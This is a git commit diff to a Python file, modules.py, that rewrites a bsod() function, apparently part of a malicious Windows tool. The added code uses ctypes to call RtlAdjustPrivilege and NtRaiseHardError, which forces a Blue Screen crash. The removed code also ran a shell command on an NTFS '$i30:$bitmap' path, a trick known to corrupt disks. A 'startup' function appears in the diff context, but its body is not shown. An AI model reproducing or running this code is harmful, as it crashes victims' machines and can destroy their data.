453665a91de960ff47ad66dcf3545d1bf94fcc0a
finnaminope <91102755+finnaminope@users.noreply.github.com>
2023-11-06 14:13:48 -0700

    Update modules.py
    Fix BSOD

--- modules.py
+++ modules.py
@@ -8,9 +8,30 @@ import subprocess
 import ctypes.wintypes
 
 def bsod():
-	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
-	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+	from ctypes import windll
+	from ctypes import c_int
+	from ctypes import c_uint
+	from ctypes import c_ulong
+	from ctypes import POINTER
+	from ctypes import byref
+
+	nullptr = POINTER(c_int)()
+
+	windll.ntdll.RtlAdjustPrivilege(
+    		c_uint(19), 
+    		c_uint(1), 
+    		c_uint(0), 
+    		byref(c_int())
+	)
+
+	windll.ntdll.NtRaiseHardError(
+    		c_ulong(0xC000007B), 
+    		c_ulong(0), 
+    		nullptr, 
+    		nullptr, 
+    		c_uint(6), 
+    		byref(c_uint())
+	)
 
 
 def startup(path):
